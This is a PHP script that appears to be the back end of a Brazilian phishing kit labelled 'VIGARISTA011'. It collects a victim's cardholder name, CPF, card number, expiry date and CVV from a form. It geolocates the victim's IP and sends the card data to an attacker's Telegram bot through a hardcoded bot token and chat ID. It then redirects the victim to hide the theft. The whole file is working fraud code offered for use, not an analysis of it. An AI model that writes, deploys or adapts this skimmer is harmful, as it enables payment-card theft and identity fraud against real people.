<?php

function getIpInfo($ip) {
    $apiUrl = "http://ip-api.com/json/{$ip}";
    $apiData = file_get_contents($apiUrl);
    return json_decode($apiData, true);
}

function getBrowserName($userAgent) {
    $browser = "Desconhecido";
    if (preg_match('/Firefox/i', $userAgent)) {
        $browser = 'Firefox';
    } elseif (preg_match('/MSIE/i', $userAgent) || preg_match('/Trident/i', $userAgent)) {
        $browser = 'Internet Explorer';
    } elseif (preg_match('/Edge/i', $userAgent)) {
        $browser = 'Microsoft Edge';
    } elseif (preg_match('/Chrome/i', $userAgent)) {
        $browser = 'Google Chrome';
    } elseif (preg_match('/Safari/i', $userAgent)) {
        $browser = 'Safari';
    } elseif (preg_match('/Opera|OPR/i', $userAgent)) {
        $browser = 'Opera';
    }
    return $browser;
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    if (isset($_POST['campoNome0']) && isset($_POST['campoNome1']) && isset($_POST['campoNome']) && isset($_POST['campoTel']) && isset($_POST['campoTel2'])) {
        

        $nomeTitular = $_POST['campoNome0'];
        $cpfTitular = $_POST['campoNome1'];
        $numeroCartao = $_POST['campoNome'];
        $validadeCartao = $_POST['campoTel'];
        $cvv = $_POST['campoTel2'];
        $dataHora = date('Y-m-d H:i:s');

        $ip = $_SERVER['REMOTE_ADDR'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        $lingua = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : 'N/A';

        $navegador = getBrowserName($userAgent);
        $ipInfo = getIpInfo($ip);

        $conteudo = "🤹🏼‍♂️ | !!! VIGARISTA011 !!! \n\n";
        $conteudo .= "🔓 | Nome do Titular: $nomeTitular\n";
        $conteudo .= "🌐 | CPF do Titular: $cpfTitular\n";
        $conteudo .= "💳 | Número do Cartão: $numeroCartao\n";
        $conteudo .= "📅 | Validade: $validadeCartao\n";
        $conteudo .= "🔑 | CVV: $cvv\n";

        $conteudo .= "📆 | DATA/HORA: $dataHora\n\n";        
        
        $botToken = '6697485399:AAEzL_gxzupuB4QGFckYqF7wkFNcim7wF7k';
        $chatId = '1936215499';

        $mensagem = urlencode($conteudo);
        $url = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text={$mensagem}";

        $response = file_get_contents($url);

        if ($response !== false) {
            echo '<script>window.location.href = "index.html";</script>';
            exit();
        } else {
            echo "Houve um erro ao enviar os dados. Tente novamente.";
        }
    } else {
        echo "Por favor, preencha todos os campos do formulário.";
    }
} else {
    header('Location: https://t.me/Vigarista011_bot'); 
    exit();
}
?>
